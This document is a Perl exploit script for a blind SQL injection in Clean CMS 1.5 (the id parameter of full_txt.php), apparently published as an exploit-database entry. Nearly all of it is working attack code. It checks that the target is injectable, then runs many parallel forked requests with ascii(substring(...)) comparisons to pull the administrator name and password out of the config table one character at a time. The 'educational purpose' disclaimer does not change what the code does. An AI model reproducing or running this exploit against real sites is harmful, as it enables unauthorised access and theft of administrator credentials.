Clean CMS 1.5 (full_txt.php id) Blind SQL Injection Exploit
===========================================================


# Clean CMS 1.5 (full_txt.php id) Blind SQL Injection Exploit
# url: http://www.4yoursite.nl/script_clean_cms.php
#
# Author: JosS
#
# This was written for educational purpose. Use it at your own risk.
# Author will be not responsible for any damage.
#
# Hack0wn :D

my $MAX_FIELD_LENGTH = 200 ;
my $EXIT_IF_NO_CHAR = 1 ;
my $DEFAULT_THREADS = 15 ;
my $DEFAULT_THREADS_TIMEOUT = 30 ;
my @ascii = ( 32 .. 123 ) ;
my $DEFAULT_THREADS_TIME = 1 ;

 
use LWP::UserAgent ;
 
sub _HELP_AND_EXIT
{
    die "
 
  ./$0 -u <url> -p <pattern>
 
 Options:
  -u    <url>               Ex: http://localhost/full_txt.php?id=19
  -p    <pattern>           HTML pattern.
 
 Other:
  -t    <#>                 Threads, default &#039;$DEFAULT_THREADS&#039;.
  -l    <#>                 Maximum table name length &#039;$MAX_FIELD_LENGTH&#039;.
  -T    <#>                 Timeout.
  -h                        Help (also with --help).
 
  Example:
 
  ./$0 -u \"http://localhost/full_txt.php?id=19\" -p Concurso
 
" ;
}
 
 
    my ($p, $w) = ({ @ARGV }, { }) ;
 
    map {
        &_HELP_AND_EXIT if $_ eq &#039;--help&#039; or $_ eq &#039;-h&#039; ;
    } keys %$p ;
 
    map {
        die "[!] Require: $_\n[!] Help: ./$0 --help\n" unless $p->{ $_ } ;
    } qw/-u -p/ ;
 
    $p->{&#039;-t&#039;} = ( $p->{&#039;-t&#039;} and $p->{&#039;-t&#039;} =~ /^\d+$/ ) ? $p->{&#039;-t&#039;} : ( $w->{&#039;-t&#039;} = $DEFAULT_THREADS ) ;
    $p->{&#039;-l&#039;} = ( $p->{&#039;-l&#039;} and $p->{&#039;-l&#039;} =~ /^\d+$/ ) ? $p->{&#039;-l&#039;} : ( $w->{&#039;-l&#039;} = $MAX_FIELD_LENGTH ) ;
    $p->{&#039;-T&#039;} = ( $p->{&#039;-T&#039;} and $p->{&#039;-T&#039;} =~ /^\d+$/ ) ? $p->{&#039;-T&#039;} : ( $w->{&#039;-T&#039;} = $DEFAULT_THREADS_TIMEOUT ) ;
 
    map {
        warn "[i] Getting default: $_ $w->{ $_ }\n" ;
    } sort keys %$w ;
 
    ( &_IS_VULN( $p ) ) ? &_START_WORK( $p ) : die "[i] Bad pattern ? Isn&#039;t vulnerable ?\n" ;
 
 
 
 
sub _START_WORK
{
    my $p = shift ;
 
    my $position = 1 ;
 
    pipe(R, W) ;
    pipe(Rs, Ws) ;
    autoflush STDOUT 1 ;
 
    my $sql_message = &#039;&#039; ;
    my $msg = &#039;&#039; ;
    my @pid ;
 
    while( $position <= $p->{&#039;-l&#039;} )
    {
        my $cf ;
        unless( $cf = fork ){ &_CHECKING( $p, $position ) ; exit(0) ; }
        push(@pid, $cf) ;
 
        my $count = 0 ;
        my $can_exit ;
        my $char_printed ;
 
        while(<R>)
        {
            chomp ;
            push(@pid, (split(/:/))[1] ) if /^pid/ ;
 
            my ($res, $pos, $ascii) = ( split(/ /, $_) ) ;
            $count++ if $pos == $position ;
 
            print "\b" x length($msg), ($msg = "$position $ascii " . chr($ascii) ) ;
 
            if( $res eq &#039;yes&#039; and $pos == $position ){
                    $char_printed = $can_exit = 1 ;
                    print Ws "STOP $position\n" ;
                    $sql_message .= chr( $ascii ) ;
            }
 
            last if ( $can_exit or $count == @ascii );
        }
 
        map { waitpid($_, 0) } @pid ;
 
        unless( $char_printed )
        {
            if( $EXIT_IF_NO_CHAR )
            {
                warn "\n[!] \$EXIT_IF_NO_CHAR : I can&#039;t find a valid character, position $position.\n"  ;
                last ;
            }
        }
 
        $position++ ;
    }
 
    print "[i] USER / PASSWORD:\n$sql_message\n" ;
 
}
 
sub _CHECKING
{
    my ($p, $position) = @_ ;
    my $counter = 0 ;
    my $stop_position ;
 
    foreach my $ascii ( @ascii )
    {
        $counter++ ;
 
        if( $counter % $p->{&#039;-t&#039;} == 0 )
        {
            my $stop_position ;
            eval
            {
                $SIG{&#039;ALRM&#039;} = sub { die "non_stop\n" } ;
                alarm $DEFAULT_THREADS_TIME ;
                my $line = <Rs> ;
                $stop_position = (split( / /, $line))[1] ;
                alarm 0 ;
            } ;
 
            if( ($stop_position) and $stop_position == $position ){ print "\nnext position\n" ; exit(0) ; }
        }
 
        unless(my $pid = fork )
        {
            print Ws "pid:$pid\n" or die ;
 
 
            my $url = $p->{&#039;-u&#039;} .
                &#039; AND ascii(substring((SELECT CONCAT(admin_name,0x202f20,admin_pass) FROM config LIMIT 0,1),&#039; . $position . &#039;,1))=&#039;. $ascii ;
 
            my $ua = LWP::UserAgent->new ;
            $ua->timeout( $p->{&#039;-T&#039;} ) ;
 
            my $content ;
            while( 1 )
            {
                last if $content = $ua->get( $url )->content ;
            }
 
            ( $content =~ /$p->{&#039;-p&#039;}/ ) ? print W "yes $position $ascii\n" : print W "no $position $ascii\n" ;
 
            exit( 0 ) ;
        }
 
    }
}
 
 
 
sub _IS_VULN
{
    my $p = shift ;
 
    my $ua = LWP::UserAgent->new ;
    $ua->timeout( $p->{&#039;-T&#039;} ) ;
 
    my ( $one, $two ) = (
        $ua->get( $p->{&#039;-u&#039;}." AND 1=1")->content ,
        $ua->get( $p->{&#039;-u&#039;}." AND 1=2")->content ,
    ) ;
 
    return ($one =~ /$p->{&#039;-p&#039;}/ and $two !~ /$p->{&#039;-p&#039;}/) ? 1 : undef ;
}



